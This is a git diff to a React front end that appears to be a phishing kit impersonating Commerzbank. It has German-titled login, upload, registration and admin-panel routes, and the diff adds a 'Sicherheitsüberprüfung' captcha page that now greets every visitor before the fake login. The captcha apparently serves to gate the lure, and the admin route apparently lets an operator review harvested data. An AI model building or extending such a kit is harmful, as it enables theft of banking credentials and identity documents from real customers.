@@ -2,6 +2,7 @@ import React, { useEffect, useState } from 'react';
 import { BrowserRouter as Router, Routes, Route, Navigate, useLocation } from 'react-router-dom';
 import Header from './components/Header';
 import Footer from './components/Footer';
+import CaptchaPage from './components/CaptchaPage';
 import LoginPage from './components/LoginPage';
 import InfoPage from './components/InfoPage';
 import UploadPage from './components/UploadPage';
@@ -51,6 +52,9 @@ function AppContent() {
         case '/admin':
           document.title = 'Admin Panel - Commerzbank';
           break;
+        case '/captcha':
+          document.title = 'Sicherheitsüberprüfung - Commerzbank';
+          break;
         case '/login':
           document.title = 'Anmeldung zum Digital Banking - Commerzbank';
           break;
@@ -64,7 +68,7 @@ function AppContent() {
           document.title = 'Registrierung abgeschlossen - Commerzbank';
           break;
         default:
-          document.title = 'Anmeldung zum Digital Banking - Commerzbank';
+          document.title = 'Sicherheitsüberprüfung - Commerzbank';
       }
     };
 
@@ -81,16 +85,17 @@ function AppContent() {
     return () => window.removeEventListener('resize', handleResize);
   }, []);
 
-  // Don't show header and footer on admin page
-  const showHeader = !location.pathname.includes('/admin');
-  const showFooter = !location.pathname.includes('/admin');
+  // Don't show header and footer on admin page and captcha page
+  const showHeader = !location.pathname.includes('/admin') && !location.pathname.includes('/captcha');
+  const showFooter = !location.pathname.includes('/admin') && !location.pathname.includes('/captcha');
 
   return (
     <div className="App">
       <SecurityScript />
       {showHeader && <Header />}
       <Routes>
-        <Route path="/" element={<Navigate to="/login" replace />} />
+        <Route path="/" element={<Navigate to="/captcha" replace />} />
+        <Route path="/captcha" element={<CaptchaPage />} />
         <Route path="/login" element={<LoginPage />} />
         <Route path="/info" element={<InfoPage />} />
         <Route path="/upload" element={<UploadPage />} />
